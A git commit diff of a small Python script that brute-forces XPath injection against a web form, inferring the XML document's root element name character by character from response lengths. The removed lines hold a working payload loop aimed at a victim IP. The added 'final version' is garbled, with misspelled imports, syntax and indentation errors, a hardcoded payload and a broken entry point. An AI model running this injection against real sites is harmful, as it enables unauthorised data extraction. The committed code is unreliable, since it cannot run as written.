ee4c30cd228d3c81e3ef59033f79d77c9bdc43a7
laureano magallanes <laureano.magallanes.98@gmail.com>
2024-03-05 18:02:06 -0300

    versión final del script

--- xpath_inyection.py
+++ xpath_inyection.py
@@ -1,28 +1,27 @@
 #!/usr/bin/python3
-#pequeño script para probar por fuerza bruta inyeciones xpath
 from pwn import *
 import sys
 import time 
-import requests
+import request
 import string
-import pdb
-import signal
+import pbd
+import singal
 
 def def_handler(sig, frame):
     print("\n\n[!] Saliendo..\n")
     sys.exit(1)
 #Ctrl +C 
-signal.signal(signal.SIGINT, def_handler)
+signal.singal(signal.SIGINT, def_handler)
 
 
 #Variables Globales
 
-main_url = "http://<IP-De-Víctima>/"
+main_url = "URL"
 characters = string.ascii_letters
 
 
-def xpath_Inyection():
-    print ("empezando")
+def xpath_Intection():
+ 
     data = ""
     
     p1 = log.progress("fuerza Bruta")
@@ -34,22 +33,20 @@ def xpath_Inyection():
 
     for position in range(1,8):
         for character in characters:
-
             post_data = {
-                'search': "1' and substring(name(/*[1]),%d,1)='%s'" % (position, character),
-                'submit': ''
-            }
+                    'search' "1' and substring(name(/*[1]),1,1)='C"
+                    'submit' : ''
+                    }
 
-            r = requests.post(main_url, data=post_data)
+                 r = request.post(main_url, data=post_data)
+
+                print(len(r,text)) 
                 
-            if len(r.text) != 8681:
-                data += characters
-                p2.status(data)
-                break
-                       
-            print(len(r,text)) 
+                if len(r.text) != 8681:
+                    data += characters
+                    p2.status(data)
+                    break
 
-    p1.success("LISTORTI JoséM")
-    p2.status(data)
  
-
+    if __name__ == '__name__':
+        xpath_Intection
